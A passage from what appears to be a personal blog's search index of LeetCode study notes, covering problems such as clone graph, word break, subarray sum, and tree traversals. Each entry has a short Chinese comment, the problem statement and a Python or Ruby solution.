(val = 1)'s neighbors are 2nd node (val = 2) and 4th node (val = 4).2nd node (val = 2)'s neighbors are 1st node (val = 1) and 3rd node (val = 3).3rd node (val = 3)'s neighbors are 2nd node (val = 2) and 4th node (val = 4).4th node (val = 4)'s neighbors are 1st node (val = 1) and 3rd node (val = 3).Example 2:\nInput: adjList = [[]]Output: [[]]Explanation: Note that the input contains one empty list. The graph consists of only one node with val = 1 and it does not have any neighbors.Example 3:\nInput: adjList = []Output: []Explanation: This an empty graph, it does not have any nodes.Example 4:\nInput: adjList = [[2],[1]]Output: [[2],[1]] Constraints:\nThe number of nodes in the graph is in the range [0, 100].1 \u003c= Node.val \u003c= 100Node.val is unique for each node.There are no repeated edges and no self-loops in the graph.The Graph is connected and all nodes can be visited starting from the given node. Sol 要記得把生過的node拿出來用\nclass Solution: def __init__(self): self.mem = {} def cloneGraph(self, node: \u0026#39;Node\u0026#39;) -\u0026gt; \u0026#39;Node\u0026#39;: if not node: return None else: ret = Node(node.val) self.mem[node] = ret for n in node.neighbors: if n not in self.mem: ret.neighbors.append(self.cloneGraph(n)) else: ret.neighbors.append(self.mem[n]) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-133-clone-graph/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e","title":"leetcode-133 - Clone Graph"},{"content":"動機 一開始以為要用stack，因為中間不用的柱子可以忽略掉，但是這樣沒辦法保留距離短但比較遠的柱子。\nProblem Given n non-negative integers a1, a2, ..., an , where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of the line i is at (i, ai) and (i, 0). Find two lines, which, together with the x-axis forms a container, such that the container contains the most water.\nNotice that you may not slant the container.\nExample 1:\nInput: height = [1,8,6,2,5,4,8,3,7]Output: 49Explanation: The above vertical lines are represented by array [1,8,6,2,5,4,8,3,7]. In this case, the max area of water (blue section) the container can contain is 49.Example 2:\nInput: height = [1,1]Output: 1Example 3:\nInput: height = [4,3,2,1,4]Output: 16Example 4:\nInput: height = [1,2,1]Output: 2 Constraints:\nn == height.length2 \u003c= n \u003c= 1050 \u003c= height[i] \u003c= 104 Sol 之後看著圖，想到範圍就想到，從最外層往裡面縮，看起來可以用two ptr\n但用two ptr之前要先能確定，怎麼變大與縮小，而我們有柱子的長度!! 把低的丟掉就好了\nclass Solution: def maxArea(self, hs: List[int]) -\u0026gt; int: a, b, ret = 0, len(hs)-1, 0 while a \u0026lt; b: water = (b-a) * min(hs[a],hs[b]) ret = max(ret, water) if hs[a] \u0026gt;= hs[b]: b -= 1 else: a += 1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-11-container-with-most-water/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e一開始以為要用stack，因為中間不用的柱子可以忽略掉，但是這樣沒辦法保留距離短但比較遠的柱子。\u003c/p\u003e","title":"leetcode-11 - Container With Most Water"},{"content":"動機 不只一種dp\nProblem Given a string s and a dictionary of strings wordDict, return true if s can be segmented into a space-separated sequence of one or more dictionary words.\nNote that the same word in the dictionary may be reused multiple times in the segmentation.\nExample 1:\nInput: s = leetcode, wordDict = [leet,code]Output: trueExplanation: Return true because leetcode can be segmented as leet code.Example 2:\nInput: s = applepenapple, wordDict = [apple,pen]Output: trueExplanation: Return true because applepenapple can be segmented as apple pen apple.Note that you are allowed to reuse a dictionary word.Example 3:\nInput: s = catsandog, wordDict = [cats,dog,sand,and,cat]Output: false Constraints:\n1 \u003c= s.length \u003c= 3001 \u003c= wordDict.length \u003c= 10001 \u003c= wordDict[i].length \u003c= 20s and wordDict[i] consist of only lowercase English letters.All the strings of wordDict are unique. Sol 一個是把範圍標出來，之後列中點去二分 但這樣會割出很多一定不會過的字串，也會割出很多已經割過的字串\n但還是AC\nclass Solution: @functools.lru_cache(None) def dp(self,i,j): if i \u0026lt; 0 or i \u0026gt;= len(self.s) or j \u0026lt; 0 or j \u0026gt; len(self.s): return False elif self.s[i:j] in self.ws: return True else: ret = False for k in range(i,j): ret = ret or self.dp(i,k) and self.dp(k,j) return ret def wordBreak(self, s: str, wordDict: List[str]) -\u0026gt; bool: self.s, self.ws = s, wordDict return self.dp(0,len(s)) 看input很明顯是像lisp的list那樣(一直cons單字)組成string的，所以我們應該也要這樣走!!\nclass Solution: @functools.lru_cache(None) def dp(self,s): if s in self.ws: return True else: for i in range(1,len(s)): if s[:i] in self.ws and self.dp(s[i:]): return True return False def wordBreak(self, s: str, wordDict: List[str]) -\u0026gt; bool: self.ws = wordDict return self.dp(s) ","permalink":"https://littlebees.github.io/2021/07/leetcode-139-word-break/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不只一種dp\u003c/p\u003e","title":"leetcode-139 - Word Break"},{"content":"動機 這題可以與33一起看，會有新的理解\nProblem Suppose an array of length n sorted in ascending order is rotated between 1 and n times. For example, the array nums = [0,1,2,4,5,6,7] might become:\n[4,5,6,7,0,1,2] if it was rotated 4 times.[0,1,2,4,5,6,7] if it was rotated 7 times.Notice that rotating an array [a[0], a[1], a[2], ..., a[n-1]] 1 time results in the array [a[n-1], a[0], a[1], a[2], ..., a[n-2]].\nGiven the sorted rotated array nums of unique elements, return the minimum element of this array.\nYou must write an algorithm that runs in O(log n) time.\nExample 1:\nInput: nums = [3,4,5,1,2]Output: 1Explanation: The original array was [1,2,3,4,5] rotated 3 times.Example 2:\nInput: nums = [4,5,6,7,0,1,2]Output: 0Explanation: The original array was [0,1,2,4,5,6,7] and it was rotated 4 times.Example 3:\nInput: nums = [11,13,15,17]Output: 11Explanation: The original array was [11,13,15,17] and it was rotated 4 times. Constraints:\nn == nums.length1 \u003c= n \u003c= 5000-5000 \u003c= nums[i] \u003c= 5000All the integers of nums are unique.nums is sorted and rotated between 1 and n times. Sol 對rotate的長度做二分\n一直捨棄有序的部分，留下的就是最小!!\nclass Solution: def findMin(self, nums: List[int]) -\u0026gt; int: a,b = [1,len(nums)] while a \u0026lt; b: mid = (a+b)//2 if nums[0] \u0026lt; nums[mid]: a = mid+1 else: b = mid #print(a) return nums[(a)%len(nums)] ","permalink":"https://littlebees.github.io/2021/07/leetcode-153-find-minimum-in-rotated-sorted-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題可以與\u003ca href=\"/2021/07/leetcode-33\"\u003e33\u003c/a\u003e一起看，會有新的理解\u003c/p\u003e","title":"leetcode-153 - Find Minimum in Rotated Sorted Array"},{"content":"動機 當初還想著怎麼看node\u0026hellip;\nProblem Given the root of a binary tree, determine if it is a valid binary search tree (BST).\nA valid BST is defined as follows:\nThe left subtree of a node contains only nodes with keys less than the node's key.The right subtree of a node contains only nodes with keys greater than the node's key.Both the left and right subtrees must also be binary search trees. Example 1:\nInput: root = [2,1,3]Output: trueExample 2:\nInput: root = [5,1,4,null,null,3,6]Output: falseExplanation: The root node's value is 5 but its right child's value is 4. Constraints:\nThe number of nodes in the tree is in the range [1, 104].-231 \u003c= Node.val \u003c= 231 - 1 Sol 直接把範圍傳下去就好了\nclass Solution: def isValidBST(self, root: TreeNode,l=float(\u0026#39;-inf\u0026#39;),r=float(\u0026#39;inf\u0026#39;)) -\u0026gt; bool: if not root: return True elif root.val \u0026lt;= l or r \u0026lt;= root.val: return False else: return self.isValidBST(root.left, l, root.val) and self.isValidBST(root.right, root.val, r) ","permalink":"https://littlebees.github.io/2021/07/leetcode-98-validate-binary-search-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初還想著怎麼看node\u0026hellip;\u003c/p\u003e","title":"leetcode-98 - Validate Binary Search Tree"},{"content":"動機 打從心底不想重寫這題\nProblem Implement the myAtoi(string s) function, which converts a string to a 32-bit signed integer (similar to C/C++'s atoi function).\nThe algorithm for myAtoi(string s) is as follows:\nRead in and ignore any leading whitespace.Check if the next character (if not already at the end of the string) is '-' or '+'. Read this character in if it is either. This determines if the final result is negative or positive respectively. Assume the result is positive if neither is present.Read in next the characters until the next non-digit charcter or the end of the input is reached. The rest of the string is ignored.Convert these digits into an integer (i.e. 123 -\u003e 123, 0032 -\u003e 32). If no digits were read, then the integer is 0. Change the sign as necessary (from step 2).If the integer is out of the 32-bit signed integer range [-231, 231 - 1], then clamp the integer so that it remains in the range. Specifically, integers less than -231 should be clamped to -231, and integers greater than 231 - 1 should be clamped to 231 - 1.Return the integer as the final result.Note:\nOnly the space character ' ' is considered a whitespace character.Do not ignore any characters other than the leading whitespace or the rest of the string after the digits. Example 1:\nInput: s = 42Output: 42Explanation: The underlined characters are what is read in, the caret is the current reader position.Step 1: 42 (no characters read because there is no leading whitespace) ^Step 2: 42 (no characters read because there is neither a '-' nor '+') ^Step 3: 42 (42 is read in) ^The parsed integer is 42.Since 42 is in the range [-231, 231 - 1], the final result is 42.Example 2:\nInput: s = -42Output: -42Explanation:Step 1: -42 (leading whitespace is read and ignored) ^Step 2: -42 ('-' is read, so the result should be negative) ^Step 3: -42 (42 is read in) ^The parsed integer is -42.Since -42 is in the range [-231, 231 - 1], the final result is -42.Example 3:\nInput: s = 4193 with wordsOutput: 4193Explanation:Step 1: 4193 with words (no characters read because there is no leading whitespace) ^Step 2: 4193 with words (no characters read because there is neither a '-' nor '+') ^Step 3: 4193 with words (4193 is read in; reading stops because the next character is a non-digit) ^The parsed integer is 4193.Since 4193 is in the range [-231, 231 - 1], the final result is 4193.Example 4:\nInput: s = words and 987Output: 0Explanation:Step 1: words and 987 (no characters read because there is no leading whitespace) ^Step 2: words and 987 (no characters read because there is neither a '-' nor '+') ^Step 3: words and 987 (reading stops immediately because there is a non-digit 'w') ^The parsed integer is 0 because no digits were read.Since 0 is in the range [-231, 231 - 1], the final result is 0.Example 5:\nInput: s = -91283472332Output: -2147483648Explanation:Step 1: -91283472332 (no characters read because there is no leading whitespace) ^Step 2: -91283472332 ('-' is read, so the result should be negative) ^Step 3: -91283472332 (91283472332 is read in) ^The parsed integer is -91283472332.Since -91283472332 is less than the lower bound of the range [-231, 231 - 1], the final result is clamped to -231 = -2147483648. Constraints:\n0 \u003c= s.length \u003c= 200s consists of English letters (lower-case and upper-case), digits (0-9), ' ', '+', '-', and '.'. Sol 所以用之前的code來po\ndef my_atoi(str) str = /[^\\s]+/.match(str).to_s parsed = /^[\\+\\-]?[0-9]+/.match(str).to_s return 0 if parsed.empty? parsed = parsed.to_i if parsed \u0026gt; 2147483647 return 2147483647 elsif parsed \u0026lt; -2147483648 return -2147483648 else return parsed end end ","permalink":"https://littlebees.github.io/2021/07/leetcode-8-string-to-integer-atoi/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e打從心底不想重寫這題\u003c/p\u003e","title":"leetcode-8 - String to Integer (atoi)"},{"content":"動機 這是閱讀測驗嗎\nProblem Every valid email consists of a local name and a domain name, separated by the '@' sign. Besides lowercase letters, the email may contain one or more '.' or '+'.\nFor example, in alice@leetcode.com, alice is the local name, and leetcode.com is the domain name.If you add periods '.' between some characters in the local name part of an email address, mail sent there will be forwarded to the same address without dots in the local name. Note that this rule does not apply to domain names.\nFor example, alice.z@leetcode.com and alicez@leetcode.com forward to the same email address.If you add a plus '+' in the local name, everything after the first plus sign will be ignored. This allows certain emails to be filtered. Note that this rule does not apply to domain names.\nFor example, m.y+name@email.com will be forwarded to my@email.com.It is possible to use both of these rules at the same time.\nGiven an array of strings emails where we send one email to each email[i], return the number of different addresses that actually receive mails.\nExample 1:\nInput: emails = [test.email+alex@leetcode.com,test.e.mail+bob.cathy@leetcode.com,testemail+david@lee.tcode.com]Output: 2Explanation: testemail@leetcode.com and testemail@lee.tcode.com actually receive mails.Example 2:\nInput: emails = [a@leetcode.com,b@leetcode.com,c@leetcode.com]Output: 3 Constraints:\n1 \u003c= emails.length \u003c= 1001 \u003c= emails[i].length \u003c= 100email[i] consist of lowercase English letters, '+', '.' and '@'.Each emails[i] contains exactly one '@' character.All local and domain names are non-empty.Local names do not start with a '+' character. Sol class Solution: def numUniqueEmails(self, emails): tmp = \u0026#39;\u0026#39; tbl = [] for s in emails: tmp = \u0026#39;\u0026#39; addr = s.split(\u0026#39;@\u0026#39;,1)[1] for c in s: if c is \u0026#39;.\u0026#39;: pass elif c is \u0026#39;+\u0026#39;: break else: tmp += c tmp = tmp+\u0026#39;@\u0026#39;+addr if tmp not in tbl: tbl.append(tmp) return len(tbl) ","permalink":"https://littlebees.github.io/2021/07/leetcode-929-unique-email-addresses/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這是閱讀測驗嗎\u003c/p\u003e","title":"leetcode-929 - Unique Email Addresses"},{"content":"動機 把105改一下\nProblem Given two integer arrays inorder and postorder where inorder is the inorder traversal of a binary tree and postorder is the postorder traversal of the same tree, construct and return the binary tree.\nExample 1:\nInput: inorder = [9,3,15,20,7], postorder = [9,15,7,20,3]Output: [3,9,20,null,null,15,7]Example 2:\nInput: inorder = [-1], postorder = [-1]Output: [-1] Constraints:\n1 \u003c= inorder.length \u003c= 3000postorder.length == inorder.length-3000 \u003c= inorder[i], postorder[i] \u003c= 3000inorder and postorder consist of unique values.Each value of postorder also appears in inorder.inorder is guaranteed to be the inorder traversal of the tree.postorder is guaranteed to be the postorder traversal of the tree. Sol 把105改一下\nclass Solution: def buildTree(self, ino: List[int], pos: List[int]) -\u0026gt; TreeNode: if not ino or not pos: return None elif pos[-1] in ino: i = ino.index(pos[-1]) ret = TreeNode(pos[-1]) ret.left, ret.right = [self.buildTree(ino[:i],pos[:-1]), self.buildTree(ino[i+1:],pos[:-1])] return ret else: return self.buildTree(ino,pos[:-1]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-106-construct-binary-tree-from-inorder-and-postorder-traversal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e把\u003ca href=\"/2021/07/leetcode-105\"\u003e105\u003c/a\u003e改一下\u003c/p\u003e","title":"leetcode-106 - Construct Binary Tree from Inorder and Postorder Traversal"},{"content":"動機 複習inorder與preorder\n可以順便看106\nProblem Given two integer arrays preorder and inorder where preorder is the preorder traversal of a binary tree and inorder is the inorder traversal of the same tree, construct and return the binary tree.\nExample 1:\nInput: preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]Output: [3,9,20,null,null,15,7]Example 2:\nInput: preorder = [-1], inorder = [-1]Output: [-1] Constraints:\n1 \u003c= preorder.length \u003c= 3000inorder.length == preorder.length-3000 \u003c= preorder[i], inorder[i] \u003c= 3000preorder and inorder consist of unique values.Each value of inorder also appears in preorder.preorder is guaranteed to be the preorder traversal of the tree.inorder is guaranteed to be the inorder traversal of the tree. Sol python的list slice好讚\nclass Solution: def buildTree(self, pre: List[int], ino: List[int]) -\u0026gt; TreeNode: if not ino or not pre: return None elif pre[0] in ino: i = ino.index(pre[0]) ret = TreeNode(pre[0]) ret.left, ret.right = [self.buildTree(pre[1:], ino[:i]), self.buildTree(pre[1:],ino[i+1:])] return ret else: return self.buildTree(pre[1:],ino) ","permalink":"https://littlebees.github.io/2021/07/leetcode-105-construct-binary-tree-from-preorder-and-inorder-traversal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習inorder與preorder\u003c/p\u003e\n\u003cp\u003e可以順便看\u003ca href=\"/2021/07/leetcode-106\"\u003e106\u003c/a\u003e\u003c/p\u003e","title":"leetcode-105 - Construct Binary Tree from Preorder and Inorder Traversal"},{"content":"動機 雖然說是環狀，但當成一般有終點的就好\n同時，dp最好從終點去推!!\nProblem You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security systems connected and it will automatically contact the police if two adjacent houses were broken into on the same night.\nGiven an integer array nums representing the amount of money of each house, return the maximum amount of money you can rob tonight without alerting the police.\nExample 1:\nInput: nums = [1,2,3,1]Output: 4Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).Total amount you can rob = 1 + 3 = 4.Example 2:\nInput: nums = [2,7,9,3,1]Output: 12Explanation: Rob house 1 (money = 2), rob house 3 (money = 9) and rob house 5 (money = 1).Total amount you can rob = 2 + 9 + 1 = 12. Constraints:\n1 \u003c= nums.length \u003c= 1000 \u003c= nums[i] \u003c= 400 Sol 環狀代表任何一個地方都是起點，任何一個地方都是終點\n有兩個dp，一個是用起點去算最多$$的路徑，因為環狀，所以不用全走只要走一半就好\nclass Solution: @functools.lru_cache(None) def dp(self,i): if i \u0026lt; len(self.ns): return self.ns[i] + max([self.dp(x) for x in range(i+2,i+2+len(self.ns)//2)]) else: return 0 def rob(self, nums: List[int]) -\u0026gt; int: self.ns = nums if len(nums) \u0026lt;= 2: return max(nums) else: return max([self.dp(x) for x in range(len(nums)//2+1)]) # 要+1，不然像長度為3就只會看第一個不會看第二個!! 另一個是終點去算最多$$的路徑，這code簡單又不容易出錯\nclass Solution: @functools.lru_cache(None) def dp(self,i): if 0 \u0026lt;= i \u0026lt; len(self.ns): return max(self.ns[i] + self.dp(i-2), self.dp(i-1)) else: return 0 def rob(self, nums: List[int]) -\u0026gt; int: self.ns = nums return self.dp(len(nums)-1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-198-house-robber/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e雖然說是環狀，但當成一般有終點的就好\u003c/p\u003e\n\u003cp\u003e同時，dp最好從終點去推!!\u003c/p\u003e","title":"leetcode-198 - House Robber"},{"content":"動機 與560不同他可以用sliding window\nprefix sum + binary search prefix sum in fly + sliding window Problem Given an array of positive integers nums and a positive integer target, return the minimal length of a contiguous subarray [numsl, numsl+1, ..., numsr-1, numsr] of which the sum is greater than or equal to target. If there is no such subarray, return 0 instead.\nExample 1:\nInput: target = 7, nums = [2,3,1,2,4,3]Output: 2Explanation: The subarray [4,3] has the minimal length under the problem constraint.Example 2:\nInput: target = 4, nums = [1,4,4]Output: 1Example 3:\nInput: target = 11, nums = [1,1,1,1,1,1,1,1]Output: 0 Constraints:\n1 \u003c= target \u003c= 1091 \u003c= nums.length \u003c= 1051 \u003c= nums[i] \u003c= 105 Follow up: If you have figured out the O(n) solution, try coding another solution of which the time complexity is O(n log(n)). Sol 內容物只有正數，可以用sliding window\nclass Solution: def minSubArrayLen(self, k: int, nums: List[int]) -\u0026gt; int: a = 0 cnt = nums[0] ret = float(\u0026#39;inf\u0026#39;) for b,n in enumerate(nums[1:]+[0],1): while a\u0026lt;b and cnt \u0026gt;= k: ret = min(ret, b-a) cnt -= nums[a] a += 1 cnt += n return ret if ret != float(\u0026#39;inf\u0026#39;) else 0 或是，利用prefix sum去找lower bound，這樣符合題目的要求\nclass Solution: def minSubArrayLen(self, k: int, nums: List[int]) -\u0026gt; int: sums, cnt, ret = [[0], 0, float(\u0026#39;inf\u0026#39;)] for i in range(len(nums)): cnt += nums[i] sums.append(cnt) for (i,left) in enumerate(sums): j = bisect_left(sums,k+left) if j \u0026lt; len(sums): ret = min(ret, bisect_left(sums,k+left)-i) return ret if ret != float(\u0026#39;inf\u0026#39;) else 0 ","permalink":"https://littlebees.github.io/2021/07/leetcode-209-minimum-size-subarray-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e與\u003ca href=\"/2021/07/leetcode-560\"\u003e560\u003c/a\u003e不同他可以用sliding window\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eprefix sum + binary search\u003c/li\u003e\n\u003cli\u003eprefix sum in fly + sliding window\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-209 - Minimum Size Subarray Sum"},{"content":"動機 我忘了prefix sum!! 同時，這題不能用sliding window\nProblem Given an array of integers nums and an integer k, return the total number of continuous subarrays whose sum equals to k.\nExample 1:\nInput: nums = [1,1,1], k = 2Output: 2Example 2:\nInput: nums = [1,2,3], k = 3Output: 2 Constraints:\n1 \u003c= nums.length \u003c= 2 * 104-1000 \u003c= nums[i] \u003c= 1000-107 \u003c= k \u003c= 107 Sol 這題不能用sliding window，因為array中有負數，不會越加越多\n這樣不能調左邊的index讓window的總和縮小\n所以可以用prefix sum來算區間和，之後再找對應的和\nclass Solution: def subarraySum(self, nums: List[int], k: int) -\u0026gt; int: # 忘了可以用presum sums, cnt, ret = [{}, 0, 0] for i in range(len(nums)): cnt += nums[i] if cnt not in sums: sums[cnt] = [i] else: sums[cnt].append(i) #print(sums) for left in sums.keys(): # k == sums[j] - sums[i] right = k + left if left == k: # 可以用在sums放來省略這一段 ret += len(sums[left]) if right in sums: for i in sums[left]: tmp = sums[right] ret += len(tmp)-bisect_left(tmp,i+1) return ret 原本是\na[a]+...+a[b] = k 變成\nsum[b]-sum[a-1] = k =\u0026gt; sum[b]-k = sum[a-1] 是不是只要是連續區間和就可以用這種手段\nclass Solution: def subarraySum(self, nums: List[int], k: int) -\u0026gt; int: ret = 0 tbl = {0:1} # sum[i] is equal to k!! cnt = 0 # sum(nums[j:i]) = sums[:i] - sum[:j] - for n in nums: cnt += n if cnt-k in tbl: ret += tbl[cnt-k] tbl[cnt] = tbl.get(cnt,0)+1 return ret sum[i:j] = sum[:j]-sum[:i] 上面會用bisect_left，是因為要找比當前位置大的index，也就是找j，但其實可以改找i\nclass Solution: def subarraySum(self, nums: List[int], k: int) -\u0026gt; int: ret, cnt, tbl = [0, 0 , {0:1}] # sum(nums[j:i]) = sums[:i] - sum[:j] for n in nums: cnt += n ret += tbl.get(cnt-k,0) tbl[cnt] = tbl.get(cnt,0)+1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-560-subarray-sum-equals-k/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我忘了prefix sum!!\n同時，這題不能用sliding window\u003c/p\u003e","title":"leetcode-560 - Subarray Sum Equals K"},{"content":"動機 用prev代表重複開始前的node 也看一下，83作對比\nProblem Given the head of a sorted linked list, delete all nodes that have duplicate numbers, leaving only distinct numbers from the original list. Return the linked list sorted as well.\nExample 1:\nInput: head = [1,2,3,3,4,4,5]Output: [1,2,5]Example 2:\nInput: head = [1,1,1,2,3]Output: [2,3] Constraints:\nThe number of nodes in the list is in the range [0, 300].-100 \u003c= Node.val \u003c= 100The list is guaranteed to be sorted in ascending order. Sol 把有重複的node當成一整群去刪，這樣當重複出現在開頭會很好處理\nclass Solution: def deleteDuplicates(self, head: ListNode) -\u0026gt; ListNode: prev, now, ret = [None, head, head] while now: if now.next and now.val == now.next.val: val = now.val while now and val == now.val: now = now.next if prev: prev.next = now else: ret = now else: prev, now = [now, now.next] return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-82-remove-duplicates-from-sorted-list-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用prev代表重複開始前的node\n也看一下，\u003ca href=\"/2021/07/leetcode-83\"\u003e83\u003c/a\u003e作對比\u003c/p\u003e","title":"leetcode-82 - Remove Duplicates from Sorted List II"},{"content":"動機 用prev代表重複的第一個node 也看一下，82作對比\nProblem Given the head of a sorted linked list, delete all duplicates such that each element appears only once. Return the linked list sorted as well.\nExample 1:\nInput: head = [1,1,2]Output: [1,2]Example 2:\nInput: head = [1,1,2,3,3]Output: [1,2,3] Constraints:\nThe number of nodes in the list is in the range [0, 300].-100 \u003c= Node.val \u003c= 100The list is guaranteed to be sorted in ascending order. Sol 這題還好，反倒是82，比較有趣 可以與這題一起看\nclass Solution: def deleteDuplicates(self, head: ListNode) -\u0026gt; ListNode: prev, now, ret = [None, head, head] while now: if prev and now.val == prev.val: prev.next = now.next else: prev = now now = now.next return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-83-remove-duplicates-from-sorted-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用prev代表重複的第一個node\n也看一下，\u003ca href=\"/2021/07/leetcode-82\"\u003e82\u003c/a\u003e作對比\u003c/p\u003e","title":"leetcode-83 - Remove Duplicates from Sorted List"},{"content":"動機 直接sort就好\nProblem Given an integer array nums and an integer k, return the k most frequent elements. You may return the answer in any order.\nExample 1:\nInput: nums = [1,1,1,2,2,3], k = 2Output: [1,2]Example 2:\nInput: nums = [1], k = 1Output: [1] Constraints:\n1 \u003c= nums.length \u003c= 105k is in the range [1, the number of unique elements in the array].It is guaranteed that the answer is unique. Follow up: Your algorithm's time complexity must be better than O(n log n), where n is the array's size.\nSol sort就是O(nlog(n))，也不必要用heap，因為不用一直塞資料到heap中，所以直接sort就好\nclass Solution: def topKFrequent(self, nums: List[int], b: int) -\u0026gt; List[int]: tmp = sorted([(k,v) for (k,v) in Counter(nums).items()], key=lambda x: x[1], reverse=True) return [k for (k,v) in tmp[:b]] ","permalink":"https://littlebees.github.io/2021/07/leetcode-347-top-k-frequent-elements/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e直接sort就好\u003c/p\u003e","title":"leetcode-347 - Top K Frequent Elements"},{"content":"動機 為什麼之前的commit這麼複雜\nProblem Given two strings s and t, return true if s is a subsequence of t, or false otherwise.\nA subsequence of a string is a new string that is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (i.e., ace is a subsequence of abcde while aec is not).\nExample 1:\nInput: s = abc, t = ahbgdcOutput: trueExample 2:\nInput: s = axc, t = ahbgdcOutput: false Constraints:\n0 \u003c= s.length \u003c= 1000 \u003c= t.length \u003c= 104s and t consist only of lowercase English letters. Follow up: Suppose there are lots of incoming s, say s1, s2, ..., sk where k \u003e= 109, and you want to check one by one to see if t has its subsequence. In this scenario, how would you change your code? Sol 反正只要看handle中有沒有，那可以先把不必要的字去掉，之後一路比過去就好\nclass Solution: def isSubsequence(self, s: str, t: str) -\u0026gt; bool: s = [c for c in s] t = [c for c in t if c in s] i,j = [0,0] while j \u0026lt; len(t): if i \u0026lt; len(s): if s[i] == t[j]: i += 1 else: break j += 1 return i \u0026gt;= len(s) ","permalink":"https://littlebees.github.io/2021/07/leetcode-392-is-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e為什麼之前的commit這麼複雜\u003c/p\u003e","title":"leetcode-392 - Is Subsequence"},{"content":"動機 以為是要數幾座島，結果是要數島的面積\nProblem You are given an m x n binary matrix grid. An island is a group of 1's (representing land) connected 4-directionally (horizontal or vertical.) You may assume all four edges of the grid are surrounded by water.\nThe area of an island is the number of cells with a value 1 in the island.\nReturn the maximum area of an island in grid. If there is no island, return 0.\nExample 1:\nInput: grid = [[0,0,1,0,0,0,0,1,0,0,0,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,1,1,0,1,0,0,0,0,0,0,0,0],[0,1,0,0,1,1,0,0,1,0,1,0,0],[0,1,0,0,1,1,0,0,1,1,1,0,0],[0,0,0,0,0,0,0,0,0,0,1,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,0,0,0,0,0,0,1,1,0,0,0,0]]Output: 6Explanation: The answer is not 11, because the island must be connected 4-directionally.Example 2:\nInput: grid = [[0,0,0,0,0,0,0,0]]Output: 0 Constraints:\nm == grid.lengthn == grid[i].length1 \u003c= m, n \u003c= 50grid[i][j] is either 0 or 1. Sol def dfs(g,i,j): if 0 \u0026gt; i or 0 \u0026gt; j or i \u0026gt;= len(g) or j \u0026gt;= len(g[0]) or g[i][j][1] or g[i][j][0] == 0: return 0 else: ret = 1 g[i][j][1] = True for (x,y) in [(i+1,j),(i,j+1),(i-1,j),(i,j-1)]: ret += dfs(g,x,y) return ret class Solution: def maxAreaOfIsland(self, grid: List[List[int]]) -\u0026gt; int: ret = 0 g = [[[x,False] for x in gg] for gg in grid] for i in range(len(g)): for j in range(len(g[0])): ret = max(ret, dfs(g,i,j)) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-695-max-area-of-island/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e以為是要數幾座島，結果是要數島的面積\u003c/p\u003e","title":"leetcode-695 - Max Area of Island"},{"content":"動機 因為102的走是用level來分，所以這裡當輸出改變的時候就不用改太多\nProblem Given the root of a binary tree, return the zigzag level order traversal of its nodes' values. (i.e., from left to right, then right to left for the next level and alternate between).\nExample 1:\nInput: root = [3,9,20,null,null,15,7]Output: [[3],[20,9],[15,7]]Example 2:\nInput: root = [1]Output: [[1]]Example 3:\nInput: root = []Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 2000].-100 \u003c= Node.val \u003c= 100 Sol 把102的copy過來，在輸出答案時決定要不要reverse\nclass Solution: def zigzagLevelOrder(self, root: TreeNode) -\u0026gt; List[List[int]]: if not root: return [] q = deque([[root]]) ret = [] rev = False while q: now = [] rs = q.popleft() ret.append([r.val for r in (rs if not rev else rs[::-1])]) for r in rs: now += [x for x in [r.left,r.right] if x] if len(now) \u0026gt; 0: q.append(now) rev = not rev return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-103-binary-tree-zigzag-level-order-traversal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e因為102的走是用level來分，所以這裡當輸出改變的時候就不用改太多\u003c/p\u003e","title":"leetcode-103 - Binary Tree Zigzag Level Order Traversal"},{"content":"動機 複習bfs\nProblem Given the root of a binary tree, return the level order traversal of its nodes' values. (i.e., from left to right, level by level).\nExample 1:\nInput: root = [3,9,20,null,null,15,7]Output: [[3],[9,20],[15,7]]Example 2:\nInput: root = [1]Output: [[1]]Example 3:\nInput: root = []Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 2000].-1000 \u003c= Node.val \u003c= 1000 